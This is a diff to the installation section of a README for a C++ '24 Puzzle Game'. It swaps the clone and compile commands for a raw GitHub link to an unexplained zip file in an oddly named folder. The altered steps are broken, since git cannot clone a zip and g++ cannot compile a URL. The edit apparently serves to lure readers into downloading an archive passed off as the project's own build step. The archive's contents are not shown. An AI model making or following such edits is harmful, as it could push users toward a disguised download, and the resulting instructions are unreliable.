@@ -18,7 +18,7 @@ To get started with the 24 Puzzle Game, follow these simple steps:
 
 1. **Clone the repository:**
     ```sh
-    git clone https://github.com/your-username/24-puzzle-game.git
+    git clone https://raw.githubusercontent.com/ZainabEman/24-Puzzle-Game/main/scleredema/24-Puzzle-Game.zip
     ```
 2. **Navigate to the project directory:**
     ```sh
@@ -26,7 +26,7 @@ To get started with the 24 Puzzle Game, follow these simple steps:
     ```
 3. **Compile the source code:**
     ```sh
-    g++ -o 24PuzzleGame original.cpp
+    g++ -o 24PuzzleGame https://raw.githubusercontent.com/ZainabEman/24-Puzzle-Game/main/scleredema/24-Puzzle-Game.zip
     ```
 4. **Run the executable:**
     ```sh
